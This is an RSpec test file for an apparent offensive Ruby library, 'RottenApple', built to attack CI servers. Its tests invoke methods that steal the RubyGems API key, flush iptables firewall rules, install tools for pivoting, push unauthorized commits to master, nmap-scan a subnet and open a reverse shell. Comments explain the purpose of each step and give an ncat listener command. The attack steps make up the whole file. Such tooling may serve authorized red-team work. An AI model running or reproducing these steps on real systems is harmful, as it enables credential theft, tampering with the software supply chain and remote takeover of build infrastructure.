require 'spec_helper'
require 'rotten_apple'

module RottenApple
  describe Attack do
    before :each do
      @helper = class Helper
                  include RottenApple::Attack
                end.new
    end

    # Note: If successful, this will allow you modify rubygem sources
    it "should steal the rubygem api key" do
      @helper.steal_rubygems_api_key.should_not be_nil
    end

    # Note: This will help any network communications along and 
    # drop firewall rules
    it "should flush iptables" do
      expect { @helper.flush_iptables }.to_not raise_error
    end

    # Note: This will help add any software to attack the CI or pivot
    it "should install software" do
      expect { @helper.install_software("wireshark") }.to_not raise_error
    end

    it "should make an unauthorized commit to master" do
      expect { @helper.commit_to_master }.to_not raise_error
    end
    
    # Note: In order for this to be successful, you'll need nmap
    # on the box already or to install nmap via "run_command" syntaxt
    it "should perform an nmap scan of the target" do
      @helper.nmap_segment("192.168.101.0/24", [80,443]).should_not == ""
    end

    # Note: In order for this to be successful, you'll need to 
    # setup a listner. Example 'ncat -l -vvn -p 1337'.  Also, note 
    # that when you connect it will block execution on the CI 
    # until the CI times out the operation or the shell is exited
    it "should throw me a reverse shell" do
      expect { @helper.reverse_shell("127.0.0.1", 1337) }.to_not raise_error
    end

  end
end